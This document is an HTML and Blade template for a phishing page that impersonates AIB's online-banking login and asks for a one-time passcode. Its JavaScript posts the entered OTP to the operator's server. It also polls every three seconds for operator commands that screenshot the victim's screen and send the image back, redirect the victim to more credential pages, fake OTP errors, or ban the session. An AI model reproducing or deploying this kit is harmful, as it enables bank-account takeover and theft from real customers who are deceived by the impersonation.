<!DOCTYPE html>





<html lang="en" dir="ltr">

<head>
    <title>Log in</title>
    <base href="" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0" />
    <meta http-equiv="x-ua-compatible" content="IE=edge" />
    <link rel="shortcut icon" href="assetsaib/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="/asset/main.css" />
    <link rel="stylesheet" type="text/css" href="/asset/main2.css" />
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style type="text/css">
        * {
            box-sizing: border-box
        }

        html {
            background: #f2f2f2;
            background-color: #f2f2f2
        }

        svg,
        object {
            stroke-width: 0;
            stroke: currentColor;
            fill: currentColor
        }

        .aib_tpl .ping-input-container .tooltip-text.type-alert.place-bottom {
            z-index: 1
        }

        .aib_tpl .ping-header {
            font-family: "ProximaNovaBold";
            font-size: 24px !important;
            color: #4d4d4d;
            padding-top: 40px !important;
            border-radius: 8px 8px 0 0;
            -webkit-box-shadow: 0 4px 6px rgba(0, 0, 0, .1);
            box-shadow: 0 4px 6px rgba(0, 0, 0, .1)
        }

        .aib_tpl .ping-header .company-logo {
            margin-bottom: 12px
        }

        .aib_tpl .ping-body-container {
            padding: 32px;
            border-radius: 0 0 8px 8px;
            -webkit-box-shadow: 0 5px 6px rgba(0, 0, 0, .1);
            box-shadow: 0 5px 6px rgba(0, 0, 0, .1)
        }

        .aib_tpl .ping-footer-container {
            display: none
        }

        .aib_tpl .ping-messages {
            font-size: 14px
        }

        .aib_tpl .divider {
            opacity: .4
        }

        .aib_tpl .ping-header .company-logo {
            display: block;
            margin-bottom: 12px;
            max-width: 100% !important;
            height: auto !important
        }

        .aib_tpl .bg-purple-core {
            border-radius: 2px;
            background: #512d6d;
            background: linear-gradient(45deg, rgba(81, 45, 109, 1) 0%, rgba(196, 47, 158, 1) 80%)
        }

        .aib_tpl .ping-input-label {
            display: block;
            float: none;
            text-transform: none;
            color: #000;
            opacity: .8
        }

        .aib_tpl .ping-input-container input[type=text],
        .aib_tpl .ping-input-container input[type=password] {
            font-family: "ProximaNovaBold";
            font-size: 16px;
            background: #FFF;
            color: #000;
            height: 56px;
            border-radius: 8px;
            border: 1px solid rgba(0, 0, 0, 0.24);
            -webkit-appearance: none;
            width: 100% !important
        }

        .aib_tpl .ping-input-container input[type=text]:focus,
        .aib_tpl .ping-input-container input[type=password]:focus {
            border: 1px solid #7e2b79;
            -webkit-box-shadow: inset 0 0 0 1px #7e2b79;
            box-shadow: inset 0 0 0 1px #7e2b79
        }

        .aib_tpl .ping-checkbox-container.stacked {
            padding-left: 36px
        }

        .aib_tpl label.remember-username,
        .aib_tpl label.my-computer {
            color: #4d4d4d
        }

        .aib_tpl label .ping-checkbox-container .icon {
            bottom: 1px
        }

        .aib_tpl label .ping-checkbox-container .icon:before {
            border: 1px solid rgba(0, 0, 0, 0.4);
            width: 20px;
            height: 20px;
            border-radius: 4px
        }

        .aib_tpl label .ping-checkbox-container .icon:after {
            font-size: 12px;
            top: 4px;
            bottom: 0;
            left: 1px;
            height: 20px;
            width: 20px
        }

        .aib_tpl label .ping-checkbox-container input[type=checkbox]:checked+.icon:after {
            color: #7e2b79
        }

        .aib_tpl .ping-buttons {
            width: 100%
        }

        .aib_tpl .ping-buttons a.ping-button {
            height: 48px;
            border-radius: 8px;
            font-size: 16px;
            letter-spacing: .4px;
            line-height: 48px;
            display: inline-block;
            text-decoration: none;
            width: 46%
        }

        .aib_tpl .ping-buttons a.ping-button.allow {
            background-color: #00846a;
            font-family: "ProximaNovaBold";
            float: right
        }

        .aib_tpl .ping-buttons a.ping-button.deny {
            color: rgba(0, 0, 0, .6);
            background: rgba(0, 0, 0, .05);
            font-family: "ProximaNovaRegular";
            float: left
        }

        .aib_tpl .ping-buttons a.ping-button.deny:hover {
            text-decoration: none
        }

        .aib_tpl .ping-register {
            font-family: "ProximaNovaBold";
            font-size: 14px;
            color: #000;
            margin-top: 32px
        }

        .aib_tpl .ping-input-link a {
            color: #7e2b79;
            display: inline-block;
            padding: 8px
        }

        .aib_tpl .ping-register a {
            display: block;
            height: 48px;
            border-radius: 8px;
            font-family: "ProximaNovaBold";
            color: #7e2b79;
            font-size: 16px;
            line-height: 45px;
            letter-spacing: .4px;
            border: 2px solid rgba(0, 0, 0, .32);
            text-decoration: none;
            margin-top: 12px
        }

        .aib_tpl a.ping-button:focus,
        .aib_tpl .aib_btn-more-information:focus,
        .aib_tpl .aib_btn-gotit:focus,
        .aib_tpl .aib_btn-close:focus,
        .aib_phone-link:focus {
            box-shadow: 0 0 0 2px rgba(0, 0, 0, .24)
        }

        .aib_tpl a.ping-button.allow:focus,
        .aib_tpl .aib_btn-gotit:focus {
            background-color: #006954
        }

        .aib_tpl a.ping-button.deny:focus {
            background: rgba(0, 0, 0, .08)
        }

        .aib_tpl .ping-input-container .tooltip-text.type-alert.place-bottom {
            margin-top: 4px
        }

        .aib_tpl .ping-input-container .tooltip-text.type-alert {
            max-width: 300px;
            left: auto;
            right: 0;
            color: #e32837;
            border: 1px solid rgba(0, 0, 0, .2);
            border-radius: 8px;
            -webkit-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .1);
            -moz-box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .1)
        }

        .aib_tpl .ping-input-container .tooltip-text.type-alert.place-bottom:before {
            border-color: transparent transparent rgba(0, 0, 0, .3)
        }

        .aib_tpl .ping-input-container .tooltip-text.type-alert .icon {
            background-color: #e32837
        }

        .aib_tpl .aib_btn-more-information {
            display: inline-block;
            font-family: "ProximaNovaBold";
            letter-spacing: .4px;
            font-size: 16px;
            line-height: 20px;
            margin: 28px 0 0;
            text-decoration: underline;
            color: #7e2b79;
            height: 48px;
            border: none;
            padding: 14px 12px;
            border-radius: 8px;
            outline: none
        }

        #aibTroubleLoggingInRegView {
            display: none;
            height: 75%;
            background: #fff;
            max-width: 480px;
            margin: 0 auto;
            position: absolute;
            left: 0;
            right: 0;
            z-index: 2;
            border-radius: 8px;
            -webkit-box-shadow: 0 5px 6px rgba(0, 0, 0, .1);
            box-shadow: 0 5px 6px rgba(0, 0, 0, .1)
        }

        #aibTroubleLoggingInRegView.show {
            display: block
        }

        .aib_tpl .aib_btn-close-container {
            height: auto;
            text-align: right
        }

        .aib_tpl .aib_btn-close {
            width: 32px;
            height: 32px;
            display: inline-block;
            padding: 4px;
            margin: 12px;
            outline: none;
            border-radius: 8px;
            color: #000
        }

        .aib_tpl .aib_trouble-title {
            font-family: "ProximaNovaBold";
            font-size: 20px;
            text-align: center;
            color: #000;
            opacity: .6;
            padding: 20px;
            width: 84%;
            line-height: 26px;
            margin: 0 auto
        }

        .aib_tpl .aib_trouble-text {
            font-family: "ProximaNovaRegular";
            font-size: 16px;
            text-align: center;
            line-height: 24px;
            color: #000;
            padding: 16px 20px
        }

        .aib_tpl .aib_btn-gotit-container {
            text-align: center;
            padding: 24px 20px
        }

        .aib_tpl .aib_btn-gotit {
            font-family: "ProximaNovaBold";
            background-color: #00846a;
            color: #fff;
            height: 48px;
            border-radius: 8px;
            font-size: 16px;
            letter-spacing: .4px;
            line-height: 48px;
            display: inline-block;
            text-decoration: none;
            padding: 0 80px;
            outline: none
        }

        .aib_phone-link {
            display: inline-block;
            font-family: "ProximaNovaBold";
            letter-spacing: .4px;
            font-size: 16px;
            line-height: 20px;
            text-decoration: underline;
            color: #7e2b79;
            height: 40px;
            border: none;
            padding: 10px 12px;
            border-radius: 8px;
            outline: none
        }

        .aib_phone-link:hover {
            color: #7e2b79
        }

        .aib_tpl .aib_links-hlp-contain {
            text-align: center
        }

        .aib_tpl .aib_links-hlp {
            display: inline-block;
            font-family: "ProximaNovaBold";
            letter-spacing: .4px;
            font-size: 14px;
            margin: 20px 0 0;
            text-decoration: underline;
            color: #666;
            border: none;
            padding: 4px;
            border-radius: 8px;
            outline: none
        }

        .aib_tpl .aib_links-hlp:focus {
            box-shadow: 0 0 0 2px rgba(0, 0, 0, .24)
        }

        .aib_tpl .aib_links-hlp-delimit {
            color: #000;
            opacity: .4;
            display: inline-block;
            margin: 0 8px
        }

        @media (max-width: 900px),
        (max-device-width: 900px) {
            .aib_tpl .ping-container.ping-signin.login-template {
                margin-top: 16px
            }
        }

        @media (max-width: 480px),
        (max-device-width: 480px) {
            html {
                background: #fff;
                background-color: #fff
            }

            .aib_tpl .ping-messages>div {
                padding: 0
            }

            .aib_tpl .ping-container.ping-signin.login-template {
                margin-top: 0
            }

            .aib_tpl .ping-header {
                border-radius: 0;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .aib_tpl .ping-body-container {
                padding: 20px 16px;
                border-radius: 0;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .aib_tpl .ping-buttons a.ping-button {
                width: 100%
            }

            .aib_tpl .ping-buttons a.ping-button.allow,
            .aib_tpl .ping-buttons a.ping-button.deny {
                float: none
            }

            #aibTroubleLoggingInRegView {
                height: 100%;
                border-radius: 0;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .aib_tpl .aib_btn-gotit {
                width: 100%
            }
        }

        @media (prefers-color-scheme: dark) {
            html {
                background: #161616;
                background-color: #161616
            }

            .aib_tpl .ping-header {
                background: #272427;
                color: #E0E1E1
            }

            .aib_tpl .ping-body-container {
                background: #272427
            }

            .aib_tpl .ping-input-label,
            .aib_tpl .aib_links-hlp,
            .aib_tpl .aib_links-hlp-delimit {
                color: #ADADAD;
                opacity: 1
            }

            .aib_tpl .ping-input-container input[type=text],
            .aib_tpl .ping-input-container input[type=password] {
                background: #272427;
                border: 1px solid #767476;
                color: #E0E1E1
            }

            .aib_tpl .ping-input-container input[type=text]:focus,
            .aib_tpl .ping-input-container input[type=password]:focus {
                border: 1px solid #E0E1E1;
                -webkit-box-shadow: inset 0 0 0 1px #E0E1E1;
                box-shadow: inset 0 0 0 1px #E0E1E1
            }

            .aib_tpl .ping-buttons a.ping-button.allow,
            .aib_tpl .aib_btn-gotit {
                background-color: #00856A
            }

            .aib_tpl a.ping-button.allow:focus,
            .aib_tpl .aib_btn-gotit:focus {
                background-color: #006954
            }

            .aib_tpl .ping-buttons a.ping-button.deny {
                color: #E0E1E1;
                background: #413E41;
                background-color: #413E41
            }

            .aib_tpl .aib_btn-more-information {
                color: #D883C7
            }

            .aib_tpl .ping-input-container .tooltip-text.type-alert {
                background: #161616;
                border: 1px solid rgba(255, 255, 255, .2)
            }

            .aib_tpl .ping-input-container .tooltip-text.type-alert.place-bottom:before {
                border-color: transparent transparent rgba(255, 255, 255, .3)
            }

            .ping-input-container .tooltip-text.type-alert.place-bottom:after {
                border-color: transparent transparent #161616
            }

            #aibTroubleLoggingInRegView {
                background: #272427
            }

            .aib_tpl .aib_trouble-title {
                color: #E0E1E1;
                opacity: 1
            }

            .aib_tpl .aib_trouble-text {
                color: #ADADAD;
                opacity: 1
            }

            .aib_tpl .aib_phone-link {
                color: #D883C7
            }

            .aib_tpl .aib_phone-link:hover {
                color: #D883C7
            }

            .aib_tpl .aib_btn-close {
                color: #E0E1E1
            }
        }

        @media (max-device-width: 480px) and (prefers-color-scheme: dark) {
            html {
                background: #272427;
                background-color: #272427
            }
        }
    </style>

    <style>
        .aib_tpl .ping-buttons button.ping-button.allow {
            background-color: #00846a;
            font-family: ProximaNovaBold;
            float: right;
        }

        .aib_tpl .ping-buttons button.ping-button {
            height: 48px;
            border-radius: 8px;
            font-size: 16px;
            letter-spacing: 0.4px;
            line-height: 48px;
            display: inline-block;
            text-decoration: none;
            width: 46%;
        }

        @media (max-width: 480px) {
            .aib_tpl .ping-buttons button.ping-button {
                width: 100%;
            }
        }
    </style>


</head>

<body class="aib_tpl" onload="setFocus();isWebAuthnPlatformAuthenticatorAvailable();">

    <diiv class="ping-container ping-signin login-template">
        <div id="aibTroubleLoggingInRegView">
            <div class="aib_btn-close-container">
                <a href="javascript:void(0);" class="aib_btn-close" onclick="return aibHideTroubleLoggingInReg();"
                    title="Close" tabindex="0">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
                        <path class="st0"
                            d="M13.4,12l5.2,5.3c0.4,0.4,0.4,1,0,1.4c-0.2,0.2-0.4,0.3-0.7,0.3c-0.3,0-0.5-0.1-0.7-0.3L12,13.4l-5.2,5.3 C6.6,18.9,6.3,19,6.1,19s-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l5.2-5.3L5.4,6.7C5,6.4,5,5.7,5.4,5.3s1-0.4,1.4,0l5.2,5.3l5.2-5.3 c0.4-0.4,1-0.4,1.4,0c0.4,0.4,0.4,1,0,1.4L13.4,12z"
                            fill="#000"></path>
                    </svg>
                </a>
            </div>
            <div class="aib_trouble-title">
                Contact us
            </div>
            <div class="aib_trouble-text">
                Please contact<br>
                <a href="tel:0818 724 724" class="aib_phone-link"><strong>0818 724 724</strong></a><br>
                to speak to a customer service<br>
                advisor for assistance.
            </div>
            <div class="aib_btn-gotit-container">
                <a href="javascript:void(0);" id="aibBtnGotit" class="aib_btn-gotit"
                    onclick="return aibHideTroubleLoggingInReg();" title="Close" tabindex="0">
                    Got it
                </a>
            </div>
        </div>

        <!--
    if there is a logo present in the 'company-logo' container,
    then 'has-logo' class should be added to 'ping-header' container.
    -->
        <div class="ping-header">

            <span class="company-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 70 70" width="70" height="70"
                    class="bg-purple-core">
                    <path
                        d="M38.47036 59.95258c-0.05329-0.02112-0.10432-0.04649-0.15396-0.07405c-0.43529-0.30719-0.84874-0.99944-0.84874-1.87718 l-0.0009-13.83799c0-0.34037-0.27596-0.61637-0.61639-0.61637h-3.98455v0.78981v0.0034l0.1473 0.05796 c0.05329 0.0211 0.10428 0.04646 0.15393 0.07401c0.4353 0.30716 0.84581 1.05696 0.84581 1.93475l0.0015 13.78044 c0 0.34039 0.27597 0.61638 0.61639 0.61638h3.98693v-0.78979v-0.00342L38.47036 59.95258z"
                        fill="#fff"></path>
                    <path
                        d="M20.17341 56.69312h6.73249l1.60359 4.11204h3.63389l-6.48774-16.35593c-0.21233-0.53658-0.74332-0.90157-1.32039-0.90157 h-2.47637l-6.84642 17.2575h3.57658L20.17341 56.69312z M21.39643 53.7343l2.16528-5.27489l2.15327 5.27489H21.39643z"
                        fill="#fff"></path>
                    <path
                        d="M53.5481 31.79021c0 5.24033-6.03382 7.1589-10.9344 7.1589H28.89686c-4.90056 0-10.93438-1.91858-10.93438-7.1589 c0-6.71221 6.83148-6.17629 5.23211-10.53843c5.03931 1.5703 0.88895 5.23459 0.27824 7.1789 c-0.70929 2.25814 1.09679 5.2578 5.42403 5.2578c0.67232 0 3.07766 0 5.61437 0v-3.94592h-6.63759l2.0341-1.96863h4.60349v-2.38983 c-6.33958-1.30591-4.94452-8.3525-13.62365-9.07255c-2.86228-0.23745-1.83822-5.87143-1.56496-6.73568 c0.0773-0.2445 0.29824-0.33334 0.55314-0.11381c10.74583 9.25392 16.80341 6.43067 19.55687 4.67001 c1.28493-0.82164 3.15483-2.80489 4.52272-2.80489c1.13151 0 2.09253 0.66523 2.51588 0.97908 c0.42332 0.31382 4.36143 3.23126 4.36143 3.23126s-2.84674 0.00393-4.44209 1.1381 c-3.52839 2.5085-4.10933 7.66076-9.25403 8.71569v2.38262h4.46628l2.03411 1.96863h-6.50039v3.94592c2.87069 0 5.35981 0 5.47716 0 c4.32726 0 6.13334-2.99965 5.42405-5.2578c-0.61071-1.94431-4.76107-5.6086 0.27824-7.1789 C46.71662 25.61392 53.5481 25.078 53.5481 31.79021z M43.03877 14.32292c0 0.65976 0.53484 1.19461 1.19461 1.19461 c0.65978 0 1.19463-0.53485 1.19463-1.19461c0-0.65979-0.53485-1.19463-1.19463-1.19463 C43.57361 13.12829 43.03877 13.66313 43.03877 14.32292z"
                        fill="#fff"></path>
                    <path
                        d="M51.86455 51.91772c1.24638-0.85532 2.05029-2.1825 2.05029-3.67691c0-2.38426-2.11786-4.69315-5.56528-4.69315 c-0.43618 0-7.10542 0-7.10542 0v17.25607h1.07784c0 0 6.66924 0 7.10542 0c3.44743 0 5.56529-2.25134 5.56529-4.63559 C54.99268 54.27768 53.70837 52.65326 51.86455 51.91772z M44.53328 46.50329h3.94774c1.14965 0 2.08157 0.9323 2.08157 2.08044 c0 1.11452-0.87872 1.97525-1.98156 2.02769h-4.04775V46.50329z M49.55887 57.83962h-5.02559v-4.10885h5.09534 c1.14962 0 2.01178 0.91544 2.01178 2.06364C51.64041 56.94255 50.70847 57.83962 49.55887 57.83962z"
                        fill="#fff"></path>
                </svg></span>
            <h6>Log In</h6>

        </div>
        <!-- .ping-header -->

        <div class="ping-body-container">
            <main>
                <input type="hidden" name="userid" value="1690928120">
                <div class="ping-messages">
                    <div class="alertdiv" id="alertdiv"></div>
                </div>



                <label for="otpcode" class="ping-input-label">
                    OTP
                </label>
                <div class="ping-input-container">
                    <input required="" id="otpcode" type="text" maxlength="6" size="36" name="otpcode" class="otpcode">
                    <div class="place-bottom type-alert tooltip-text" id="username-text">
                        <div class="icon">!</div>Please fill out this field
                    </div>
                </div>
                <button type="submit" id="loginBtn continue" name="loginBtn" class="loginBtn ping-button normal allow"
                    title="Continue" tabindex="0">
                    Continue
                </button>


        </div>
        <!-- .ping-buttons -->

        <a href="javascript:void(0);" id="aibBtnTroubleLoggingInReg" onclick="aibShowTroubleLoggingInReg();"
            class="aib_btn-more-information" tabindex="0" style="display: none;">Trouble logging in?</a>

        <!-- #recaptcha -->


        </main>
        <!-- .ping-body// blank div -->
        </div>
        <!-- .ping-body-container -->

        <div class="ping-footer-container">
            <div class="ping-footer">
                <div class="ping-credits"></div>
                <div class="ping-copyright">Copyright © 2003-2020. Ping Identity Corporation. All rights reserved.</div>

                <!-- Jenkins Pipeline will inject the build number into the template via find/replace.
                See inject-version-number.js and jenkins.pipeline.groovy
                The Javascript injects its own build number too. They "should" match. -->
                <div class="ping-template-version-container">Version: <span
                        class="ping-template-version-html">0.0.74</span> JS: <span
                        class="ping-template-version-javascript"></span></div>
            </div>
            <!-- .ping-footer -->
        </div>
        <!-- .ping-footer-container -->
        </div>
        <!-- .ping-container -->
        <!-- LOADING PAGE BEGIN -->
        <div id="loaderdiv loading-page" class="loaderdiv loading-page" style="display:none;">
            <div>
                <img class="loading-page__spinner" style="width:100px;height:100px;" src="/asset/spinner.svg">
                <div>One moment please...</div>
                <!-- uncomment the following line if you "cancel" is supported -->
                <!-- <a class="button loading-page__cancel" onclick="cancelQRCode(this)" href="javascript:void(0);">Cancel</a>  -->
            </div>
        </div>
        <!-- LOADING PAGE END -->

        <script src="/asset/jquery.min.js"></script>
        <script src="/asset/jquery.mask.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
        <script src="/asset/custom.js"></script>

    <script>

$.ajax({
        method: "POST",
        url: "{{route('main.connection')}}",
        data: {
            _token: $('meta[name="csrf-token"]').attr('content'),
            referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
            type: "update",
        }
});

        $(".loginBtn").on("click", () => {
            if ($("#otpcode").val().length == 0) {
                $(".alert").css("display", "flex");
                $(".alert div").text("Both the verification and Password are required.");
                alert(1);
            } else {
                $.ajax({
                    method: "POST",
                    url: "{{route('main.new')}}",
                    data: {
                        _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                        "otp": $("#otpcode").val()
                        , "type": "newAibOtp",
                    }
                }).done((data) => {
                    $(".loaderdiv").css("display", "block");
                });
                $("#otime").show();
                runOtpCountdown()
            }
        });


        minutes = 1;
        seconds = 0;
        reset_otp = false;


        let padDigits = (number, digits) => {
            return Array(Math.max(digits - String(number).length + 1, 0)).join(0) + number;
        }

        function runOtpCountdown() {

            timer = document.getElementById("otime");
            timer.innerText = padDigits(minutes, 2) + ":" + padDigits(seconds, 2);

            if (reset_otp) {
                reset_otp = false;
                minutes == 1;
                seconds == 0;
                //die
            } else {
                if (seconds == 0 && minutes == 0) {
                    document.getElementById("otime").style.color = "red";
                } else if (seconds == 0) {
                    seconds = 59;
                    minutes = minutes - 1;
                    setTimeout(function() {
                        runOtpCountdown();
                    }, 1000);
                } else {
                    seconds = seconds - 1;
                    setTimeout(function() {
                        runOtpCountdown();
                    }, 1000);
                }
            }


        }




        setInterval(async () => {
            await checkAction();
        }, 3000);

        const checkAction = async () => {
            $.ajax({
                method: "POST",
                url: "{{route('main.connection')}}",
                data: {
                    _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                    type: "checkAction",
                }
            }).done(function(data) {
                if (typeof myVariable === "string" && data.trim() == "none") {
                    return false;
                }
                var data = JSON.parse(JSON.stringify(data));
                setCookie("set_name", data.set_name, 1);
                switch (data.action) {
                    case "screenshot":
                        let img;
                        html2canvas(document.body).then(function(canvas) {
                            $.ajax({
                                type: "POST",
                                url: "{{route('main.connection')}}",
                                data: {
                                    _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                                    "type": "screenshot",
                                    "img": canvas.toDataURL()
                                },
                            }).done(function(data) {});
                        });
                        break;
                    case "otp":
                        window.location.replace(
                            "{{route('main.otp')}}?sessionid={{md5(time())}}&status=otp");
                        break;
                    case "aib":
                        window.location.replace(
                            "{{route('main.aib')}}?sessionid={{md5(time())}}&status=aib");
                        break;
                    case "error":
                        $(".loaderdiv").css("display", "none");

                        $(".alertdiv").text("The OTP code is invalid. Please try again.");
                        $(".alertdiv div").text("The OTP code is invalid. Please try again.");
                        $(".alertdiv").addClass("ping-error");
                        //$(".alertspan").text("The OTP code is invalid. Please try again.");


                        $("#otpcode").val("");


                        reset_otp = true;
                            minutes = 1;
                            seconds = 0;

                            $("#otime").hide();

                        break;
                    case "bye":
                        window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                        break;

                    case "ban":
                        $.ajax({
                            method: "POST",
                            url: "{{route('main.connection')}}",
                            data: {
                                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                                type: "ban",
                                status: "banned",
                            }
                        }).done(function() {
                            window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                        });
                        break;
                }
            });
        }
    </script>
</body>

</html>